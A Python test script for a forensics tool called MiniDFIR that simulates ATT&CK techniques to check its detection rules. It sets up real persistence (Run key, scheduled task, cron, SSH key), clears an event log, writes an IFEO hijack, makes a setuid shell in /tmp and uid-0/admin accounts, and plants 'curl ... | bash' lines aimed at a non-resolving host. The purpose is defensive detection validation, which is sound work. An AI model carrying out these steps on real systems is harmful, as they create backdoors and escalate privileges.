
import argparse
import ctypes
import hashlib
import json
import os
import platform
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path

IS_WINDOWS = platform.system() == "Windows"

# A string that appears in NO real software. It is planted in a dropped file
# (for the file YARA scan) and its containing binary is hashed into a local
# IOC feed. Both the YARA canary rule and the IOC canary hash key on it, so a
# clean run that finds them proves the scan pipeline works end to end -- which
# a run that finds nothing (the normal, correct result on a clean host) cannot.
CANARY = "MINIDFIR-CANARY-2f8a1c9e"

# Long-lived techniques record their PID here so cleanup can end them. Memory
# forensics needs the process ALIVE at acquisition time; that is the whole
# point, but it also means they must be killed deliberately afterwards.
LIVE_PIDS = []


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def is_admin():
    try:
        if IS_WINDOWS:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except (AttributeError, OSError):
        return False


def run(cmd, shell=False):
    """Run a command, capture everything. Never raises -- a failed technique
    is recorded as failed, which is itself a valid manifest entry."""
    try:
        r = subprocess.run(cmd, shell=shell, capture_output=True, text=True,
                           timeout=60)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return -1, str(e)


# ==========================================================================
# Techniques. Each is a dict:
#   id         ATT&CK technique
#   name       human label
#   rule       the MiniDFIR rule that SHOULD catch it
#   platform   windows | linux | both
#   dangerous  needs --dangerous (creates a real privileged account)
#   run(ctx)   perform it, return {marker, detail, ...} recorded to the manifest
#   undo(rec)  reverse it using the recorded marker
#
# The `rule` field is a PREDICTION. --validate checks whether that rule (or any
# rule) actually fired on an artifact this action produced. A wrong prediction
# is useful information: it means the technique is detected by a different rule
# than expected, or not at all.
# ==========================================================================
class Ctx:
    def __init__(self):
        # everything this tool creates lives under one directory, so cleanup
        # and "did I make this?" are both trivial
        self.root = Path(tempfile.gettempdir()) / "minidfir_sim"
        self.root.mkdir(exist_ok=True)


# ---- Windows -------------------------------------------------------------
def win_run_key(ctx):
    """T1547.001 -- Registry Run key persistence."""
    payload = ctx.root / "sim_persist.exe"
    payload.write_bytes(b"MZ simulation, not a real executable")
    run(["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
         "/v", "MiniDFIRSim", "/t", "REG_SZ", "/d", str(payload), "/f"])
    return {"marker": "MiniDFIRSim", "detail": str(payload)}


def win_run_key_undo(rec):
    run(["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
         "/v", rec["marker"], "/f"])


def win_scheduled_task(ctx):
    """T1053.005 -- Scheduled Task persistence, running a script interpreter."""
    run(["schtasks", "/create", "/tn", "MiniDFIRSimTask", "/tr",
         "powershell.exe -NoProfile -Command \"Write-Output sim\"",
         "/sc", "onlogon", "/f"])
    return {"marker": "MiniDFIRSimTask", "detail": "onlogon -> powershell"}


def win_scheduled_task_undo(rec):
    run(["schtasks", "/delete", "/tn", rec["marker"], "/f"])


def win_encoded_powershell(ctx):
    """T1059.001 / T1027 -- encoded PowerShell.

    The command is a harmless Write-Output; what matters forensically is that
    it ran via -EncodedCommand, which is what the rule keys on. Recorded so
    Prefetch / Sysmon EventID 1 will carry it.
    """
    import base64
    inner = "Write-Output 'MiniDFIR simulation'"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    run(["powershell.exe", "-NoProfile", "-EncodedCommand", enc])
    return {"marker": enc[:24], "detail": "-EncodedCommand", "reversible": False}


def win_lolbin_url(ctx):
    """T1218 / T1105 -- a LOLBin invoked with a URL argument.

    certutil is asked to fetch a URL that DOES NOT RESOLVE -- the forensic
    signal is the COMMAND LINE, recorded by Sysmon EventID 1, not any actual
    download. No network egress happens.
    """
    run(["certutil.exe", "-urlcache", "-split", "-f",
         "http://minidfir.invalid/none", str(ctx.root / "none.tmp")])
    return {"marker": "minidfir.invalid", "detail": "certutil -urlcache",
            "reversible": False}


def win_clear_log(ctx):
    """T1070.001 -- clear an event log.

    Clears the tiny 'Key Management Service' log, never Security or System, so
    no real evidence is destroyed. The point is that a 1102/104 clear event is
    generated for MDF-0008 to catch.
    """
    rc, _ = run(["wevtutil", "cl", "Key Management Service"])
    return {"marker": "Key Management Service", "detail": "wevtutil cl",
            "reversible": False, "note": "" if rc == 0 else "log may not exist"}


def win_temp_execution(ctx):
    """T1204.002 -- execute from a user-writable temp directory.

    Copies the system's own choice.exe into Temp and runs it, so a real
    Prefetch / Sysmon execution record from an unusual path is produced,
    using a completely benign binary.
    """
    src = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "choice.exe"
    dst = ctx.root / "choice.exe"
    if src.exists():
        dst.write_bytes(src.read_bytes())
        run([str(dst), "/C", "y", "/D", "y", "/T", "1"])
        return {"marker": str(dst), "detail": "choice.exe from temp"}
    return {"marker": "", "detail": "choice.exe not found", "skipped": True}


def win_admin_account(ctx):
    """T1136.001 -- create a local account and add it to Administrators.

    DANGEROUS: this is a real privileged account. Gated behind --dangerous.
    Undo removes it, but run on a snapshot regardless.
    """
    run(["net", "user", "minidfirsim", "P@ssw0rd-sim-2026", "/add"])
    run(["net", "localgroup", "Administrators", "minidfirsim", "/add"])
    return {"marker": "minidfirsim", "detail": "local admin account"}


def win_admin_account_undo(rec):
    run(["net", "user", rec["marker"], "/delete"])


# ---- Windows: MEMORY (must be alive at acquisition) -----------------------
#
# Most techniques above run and EXIT in milliseconds. Memory acquisition
# happens minutes later, so nothing they did is still resident. The technique
# below stays alive past the acquisition window so a memory rule that reads the
# process command line (MDM-W009) has something to see.

def win_masquerade_svchost(ctx):
    """T1036.005 -- a process named svchost.exe running from Temp.

    Copies the benign ping.exe to Temp\\svchost.exe and runs it so it lingers
    (~50 min of loopback pings, no network egress, no GUI, no console needed).
    The genuine svchost runs only from System32; this one's command line shows
    a Temp path, which is exactly what MDM-W009 keys on. It is the first
    end-to-end test of a memory rule that reads the cmdline plugin, and of the
    MDF-C006 unexpected-parent correlation (parent will be this script, not
    services.exe).
    """
    src = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "PING.EXE"
    dst = ctx.root / "svchost.exe"
    if not src.exists():
        return {"marker": "", "detail": "ping.exe not found", "skipped": True}
    dst.write_bytes(src.read_bytes())
    p = subprocess.Popen([str(dst), "-n", "3000", "127.0.0.1"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    LIVE_PIDS.append(p.pid)
    return {"marker": str(dst), "pid": p.pid, "reversible": True,
            "detail": "ping.exe masquerading as svchost.exe from Temp"}


def win_masquerade_svchost_undo(rec):
    if rec.get("pid"):
        run(["taskkill", "/PID", str(rec["pid"]), "/F", "/T"])
    if rec.get("marker"):
        Path(rec["marker"]).unlink(missing_ok=True)


# ---- Windows: REGISTRY -----------------------------------------------------
def win_ifeo_debugger(ctx):
    """T1546.012 -- Image File Execution Options debugger hijack.

    Sets an IFEO Debugger on notepad.exe so Windows would launch our binary
    INSTEAD of notepad. This is a genuine persistence-with-execution primitive
    and the exact thing MDF-0038 looks for. We point the debugger at a benign
    marker path and never launch notepad, so nothing is actually hijacked in
    practice -- the forensic artifact (the registry value) is what matters.
    Needs admin (HKLM).
    """
    key = (r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
           r"\Image File Execution Options\notepad.exe")
    rc, _ = run(["reg", "add", key, "/v", "Debugger", "/t", "REG_SZ",
                 "/d", str(ctx.root / "sim_debugger.exe"), "/f"])
    if rc != 0:
        return {"marker": "", "detail": "IFEO write failed (need admin?)",
                "skipped": True}
    return {"marker": "notepad.exe", "detail": "IFEO Debugger set",
            "reversible": True, "key": key}


def win_ifeo_debugger_undo(rec):
    if rec.get("key"):
        run(["reg", "delete", rec["key"], "/v", "Debugger", "/f"])


# ---- Windows: FILE YARA + IOC ---------------------------------------------
def win_yara_canary(ctx):
    """Proves the FILE YARA pipeline works: discovery -> scan -> detection.

    Drops a file containing the canary string that rules/yara/canary.yar
    matches. A clean host produces zero YARA hits, which is indistinguishable
    from a silently broken scanner; this makes the difference visible. Not a
    threat -- an instrument.
    """
    dropped = ctx.root / "canary_sample.txt"
    dropped.write_text(f"benign test artifact -- {CANARY}\n", encoding="utf-8")
    return {"marker": CANARY, "detail": str(dropped), "reversible": True,
            "path": str(dropped)}


def win_yara_canary_undo(rec):
    if rec.get("path"):
        Path(rec["path"]).unlink(missing_ok=True)


def win_ioc_canary(ctx):
    """Proves the IOC pipeline works: hash extraction -> feed match.

    Drops and EXECUTES a benign binary (a copy of choice.exe), computes its
    SHA-256/MD5, and writes those into a local test feed the IOC engine loads.
    Sysmon EventID 1 records the hash of what ran; the IOC check should then
    match it against the feed. This is the only way to exercise IOC matching
    on a clean host -- no real host binary will ever be in a malware feed,
    which is why CASE02 correctly returned zero IOC hits.
    """
    src = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32" / "choice.exe"
    dst = ctx.root / "ioc_canary.exe"
    if not src.exists():
        return {"marker": "", "detail": "choice.exe not found", "skipped": True}
    data = src.read_bytes()
    dst.write_bytes(data)
    sha256 = hashlib.sha256(data).hexdigest()
    md5 = hashlib.md5(data).hexdigest()

    feeds = ctx.root.parent / "rules" / "ioc_feeds" \
        if (ctx.root.parent / "rules").exists() else Path("rules/ioc_feeds")
    feeds = Path("rules/ioc_feeds")
    feeds.mkdir(parents=True, exist_ok=True)
    feed = feeds / "minidfir_canary_feed.csv"
    feed.write_text("sha256_hash,md5_hash\n" + f"{sha256},{md5}\n",
                    encoding="utf-8")

    run([str(dst), "/C", "y", "/D", "y", "/T", "1"])
    return {"marker": sha256[:16], "detail": f"canary hash {sha256[:16]}..",
            "reversible": True, "feed": str(feed), "path": str(dst)}


def win_ioc_canary_undo(rec):
    for k in ("feed", "path"):
        if rec.get(k):
            Path(rec[k]).unlink(missing_ok=True)


# ---- Linux ---------------------------------------------------------------
def lnx_cron(ctx):
    """T1053.003 -- cron persistence calling out to a shell."""
    path = Path("/etc/cron.d/minidfir-sim")
    try:
        path.write_text("*/5 * * * * root curl -s http://minidfir.invalid/x | bash\n")
        return {"marker": str(path), "detail": "cron.d curl|bash"}
    except OSError as e:
        return {"marker": "", "detail": str(e), "skipped": True}


def lnx_cron_undo(rec):
    Path(rec["marker"]).unlink(missing_ok=True)


def lnx_ssh_key(ctx):
    """T1098.004 -- add an SSH key to root's authorized_keys."""
    d = Path("/root/.ssh")
    try:
        d.mkdir(exist_ok=True)
        ak = d / "authorized_keys"
        line = "ssh-rsa AAAAB3NzaC1yc2E-MINIDFIR-SIM sim@minidfir\n"
        prev = ak.read_text() if ak.exists() else ""
        ak.write_text(prev + line)
        return {"marker": "MINIDFIR-SIM", "detail": str(ak), "prev_len": len(prev)}
    except OSError as e:
        return {"marker": "", "detail": str(e), "skipped": True}


def lnx_ssh_key_undo(rec):
    ak = Path("/root/.ssh/authorized_keys")
    if ak.exists():
        lines = [l for l in ak.read_text().splitlines(keepends=True)
                 if rec["marker"] not in l]
        ak.write_text("".join(lines))


def lnx_shell_history(ctx):
    """T1059.004 -- a curl|bash line in shell history."""
    hist = Path.home() / ".bash_history"
    line = "curl -s http://minidfir.invalid/x.sh | bash\n"
    try:
        prev = hist.read_text() if hist.exists() else ""
        hist.write_text(prev + line)
        return {"marker": "minidfir.invalid", "detail": str(hist)}
    except OSError as e:
        return {"marker": "", "detail": str(e), "skipped": True}


def lnx_shell_history_undo(rec):
    hist = Path.home() / ".bash_history"
    if hist.exists():
        lines = [l for l in hist.read_text().splitlines(keepends=True)
                 if rec.get("marker", "\0") not in l]
        hist.write_text("".join(lines))


def lnx_suid_tmp(ctx):
    """T1548.001 -- a setuid binary in a world-writable directory."""
    dst = Path("/tmp/.minidfir-suid")
    try:
        import shutil
        shutil.copy("/bin/sh", dst)
        os.chmod(dst, 0o4755)
        return {"marker": str(dst), "detail": "setuid /bin/sh in /tmp"}
    except OSError as e:
        return {"marker": "", "detail": str(e), "skipped": True}


def lnx_suid_tmp_undo(rec):
    if rec.get("marker"):
        Path(rec["marker"]).unlink(missing_ok=True)


def lnx_root_account(ctx):
    """T1136.001 / T1078 -- a second uid-0 account. DANGEROUS."""
    run(["useradd", "-o", "-u", "0", "-g", "0", "-M", "-s", "/bin/bash",
         "minidfirsim"])
    return {"marker": "minidfirsim", "detail": "uid-0 backdoor account"}


def lnx_root_account_undo(rec):
    run(["userdel", rec["marker"]])


# ==========================================================================
TECHNIQUES = [
    # id, name, rule, platform, dangerous, run, undo
    ("T1547.001", "Registry Run key", "MDF-0017/MDF-0003", "windows", False,
     win_run_key, win_run_key_undo),
    ("T1053.005", "Scheduled task", "MDF-0004", "windows", False,
     win_scheduled_task, win_scheduled_task_undo),
    ("T1059.001", "Encoded PowerShell", "MDF-0014/MDF-0006", "windows", False,
     win_encoded_powershell, None),
    ("T1218.001", "LOLBin with URL", "MDF-0015/MDF-0002", "windows", False,
     win_lolbin_url, None),
    ("T1070.001", "Clear event log", "MDF-0008", "windows", False,
     win_clear_log, None),
    ("T1204.002", "Execute from temp", "MDF-0001/MDF-0016", "windows", False,
     win_temp_execution, None),
    ("T1136.001", "Create admin account", "MDF/Sysmon", "windows", True,
     win_admin_account, win_admin_account_undo),

    # memory: stays alive at acquisition so the cmdline masquerade rule can see it
    ("T1036.005", "svchost masquerade from Temp", "MDM-W009", "windows", False,
     win_masquerade_svchost, win_masquerade_svchost_undo),
    # registry -- needs admin (HKLM); returns skipped without it, not gated
    # behind --dangerous because it creates no account, only a registry value
    ("T1546.012", "IFEO debugger hijack", "MDF-0038", "windows", False,
     win_ifeo_debugger, win_ifeo_debugger_undo),
    # pipeline canaries: prove the file-YARA and IOC paths actually work
    ("T1204.002", "YARA file canary", "MDY_CANARY", "windows", False,
     win_yara_canary, win_yara_canary_undo),
    ("T1204.002", "IOC hash canary", "IOC-CANARY", "windows", False,
     win_ioc_canary, win_ioc_canary_undo),

    ("T1053.003", "Cron persistence", "MDL-0002", "linux", False,
     lnx_cron, lnx_cron_undo),
    ("T1098.004", "SSH authorized_keys", "MDL-0006", "linux", False,
     lnx_ssh_key, lnx_ssh_key_undo),
    ("T1059.004", "Shell history curl|bash", "MDL-0004", "linux", False,
     lnx_shell_history, lnx_shell_history_undo),
    ("T1548.001", "SUID in /tmp", "MDL-0005", "linux", False,
     lnx_suid_tmp, lnx_suid_tmp_undo),
    ("T1136.001", "uid-0 account", "MDL-0007", "linux", True,
     lnx_root_account, lnx_root_account_undo),
]


def _applicable(dangerous):
    plat = "windows" if IS_WINDOWS else "linux"
    return [t for t in TECHNIQUES if t[3] in (plat, "both")
            and (dangerous or not t[4])]


# ==========================================================================
def cmd_list():
    plat = "windows" if IS_WINDOWS else "linux"
    print(f"\nTechniques for {plat} (admin: {is_admin()}):\n")
    print(f"  {'ATT&CK':<12} {'expected rule':<20} technique")
    print("  " + "-" * 60)
    for tid, name, rule, p, danger, *_ in TECHNIQUES:
        if p not in (plat, "both"):
            continue
        tag = "  [DANGEROUS]" if danger else ""
        print(f"  {tid:<12} {rule:<20} {name}{tag}")
    print("\n  DANGEROUS techniques create a real privileged account and need "
          "--dangerous.\n  Run on a snapshotted VM.")


def cmd_run(out_path, dangerous):
    if not is_admin():
        print("WARNING: not running as admin/root. Several techniques will be "
              "skipped or fail.\n")

    ctx = Ctx()
    manifest = {"started": now(), "host": platform.node(),
                "platform": platform.system(), "os_release": platform.release(),
                "admin": is_admin(), "actions": []}

    print(f"Recording to {out_path}\n")
    for tid, name, rule, plat, danger, do, undo in _applicable(dangerous):
        started = now()
        try:
            result = do(ctx)
        except Exception as e:
            result = {"marker": "", "detail": f"error: {e}", "error": True}
        entry = {"technique": tid, "name": name, "expected_rule": rule,
                 "started": started, "finished": now(),
                 "reversible": undo is not None and not result.get("reversible") is False,
                 **result}
        manifest["actions"].append(entry)

        status = ("skipped" if result.get("skipped")
                  else "error" if result.get("error") else "done")
        print(f"  [{status:<7}] {tid:<12} {name}")
        if result.get("detail"):
            print(f"             {result['detail']}")

    manifest["finished"] = now()
    Path(out_path).write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    print(f"\n{len(manifest['actions'])} action(s) recorded.")
    print("\nNow, on the analysis box:")
    print("  1. acquire and ingest this host")
    print("  2. python main.py detect --case <case>")
    print(f"  3. python tests/attack_chain_simulation.py --validate {out_path} --case <case>")
    print(f"\nWhen finished:  python tests/attack_chain_simulation.py --cleanup {out_path}")


def cmd_cleanup(manifest_path):
    manifest = json.loads(Path(manifest_path).read_text())
    ctx_undo = {t[0]: t[6] for t in TECHNIQUES}      # id -> undo fn (may be None)
    print("Reversing recorded actions:\n")
    for action in reversed(manifest["actions"]):
        tid = action["technique"]
        undo = next((t[6] for t in TECHNIQUES
                     if t[0] == tid and t[1] == action["name"]), None)
        if undo is None:
            print(f"  [--]  {tid:<12} {action['name']} (not reversible)")
            continue
        try:
            undo(action)
            print(f"  [ok]  {tid:<12} {action['name']}")
        except Exception as e:
            print(f"  [!!]  {tid:<12} {action['name']}: {e}")

    # remove the working directory
    import shutil
    root = Path(tempfile.gettempdir()) / "minidfir_sim"
    shutil.rmtree(root, ignore_errors=True)
    print(f"\nRemoved {root}")
    print("A real account (if --dangerous was used) is deleted above, but "
          "confirm with `net user` / `cat /etc/passwd`. Roll back the snapshot "
          "to be certain.")


def cmd_validate(manifest_path, case_id):
    manifest = json.loads(Path(manifest_path).read_text())
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
    from database.database import connection
    with connection() as conn:
        objs = {r[0] for r in conn.execute("SELECT name FROM sqlite_master")}
        A = "v_artifacts" if "v_artifacts" in objs else "artifacts"
        rows = conn.execute(f"""
            SELECT d.rule_id, LOWER(a.description),
                   LOWER(COALESCE(a.raw_data, ''))
            FROM detections d JOIN {A} a ON a.id = d.artifact_id
            WHERE a.case_id = ?""", (case_id,)).fetchall()
    print(f"\n{'='*82}")
    print(f"VALIDATION -- {manifest['host']} ({manifest['platform']}) vs {case_id}")
    print(f"{'='*82}\n")
    print(f"  {'technique':<12} {'executed':<9} {'detected':<9} "
          f"{'rule fired':<20} note")
    print("  " + "-" * 78)
    detected = missed = 0
    for a in manifest["actions"]:
        if a.get("skipped"):
            print(f"  {a['technique']:<12} {'no':<9} {'--':<9} "
                  f"{'--':<20} skipped: {a.get('detail','')[:30]}")
            continue

        marker = str(a.get("marker", "")).lower()
        expected = [e.strip() for e in a["expected_rule"].split("/")
                    if e.strip() and "/" not in e and e not in ("MDF", "Sysmon")]
        fired_marker = set()
        if marker:
            for rule_id, desc, raw in rows:
                if marker in desc or marker in raw:
                    fired_marker.add(rule_id)
        # a predicted rule that fired at all in this case corroborates the
        # technique even when the rule's description does not echo the marker
        fired_expected = {rid for (rid, _d, _r) in rows if rid in expected}
        fired = fired_marker | fired_expected
        by = ("marker" if fired_marker else "rule-id" if fired_expected else "")

        if fired:
            detected += 1
            expected_str = a["expected_rule"].split("/")
            hit_expected = any(e in fired for e in expected_str)
            note = "" if hit_expected else f"(expected {a['expected_rule']})"
            print(f"  {a['technique']:<12} {'yes':<9} {'YES':<9} "
                  f"{', '.join(sorted(fired))[:20]:<20} via {by} {note}")
        else:
            missed += 1
            note = a.get("note", "") or "no rule matched this marker"
            print(f"  {a['technique']:<12} {'yes':<9} {'no':<9} "
                  f"{'--':<20} {note}")
    total = detected + missed
    print("  " + "-" * 78)
    if total:
        print(f"\n  detected {detected}/{total} executed techniques "
              f"({100*detected//total}%)")
    print("\n  A miss is not a failure of the exercise -- it is the most useful")
    print("  row in the table. 'executed, not detected, because the log was")
    print("  cleared before collection' is exactly what a validation section")
    print("  should say.")
    print("\n  NOTE: matching is by MARKER TEXT or predicted RULE-ID firing. A")
    print("  'rule-id' match means the rule fired somewhere in the case window")
    print("  but its description/raw text didn't echo the marker -- check")
    print("  triage.py to confirm it's really tied to this action before")
    print("  treating it as a confirmed detection.")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--run", action="store_true")
    ap.add_argument("--cleanup", metavar="MANIFEST")
    ap.add_argument("--validate", metavar="MANIFEST")
    ap.add_argument("--case", help="case id, for --validate and --run")
    ap.add_argument("--out", default=None,
                    help="manifest path. Default: output/<CASE>/sim_manifest.json "
                         "when --case is given, else simulation.json. Keeping it "
                         "beside the case's report is what stops it being lost -- "
                         "and without it, --cleanup cannot undo what was planted.")
    ap.add_argument("--dangerous", action="store_true",
                    help="include techniques that create a real privileged account")
    a = ap.parse_args()

    if a.list:
        cmd_list()
    elif a.run:
        out = a.out
        if out is None:
            if a.case:
                d = Path(__file__).resolve().parent.parent / "output" / a.case
                d.mkdir(parents=True, exist_ok=True)
                out = str(d / "sim_manifest.json")
            else:
                out = "simulation.json"
        cmd_run(out, a.dangerous)
    elif a.cleanup:
        cmd_cleanup(a.cleanup)
    elif a.validate:
        if not a.case:
            print("--validate needs --case")
            return 1
        cmd_validate(a.validate, a.case)
    else:
        cmd_list()
        print("\nUse --run to execute, --validate to score, --cleanup to undo.")
    return 0


if __name__ == "__main__":
    sys.exit(main())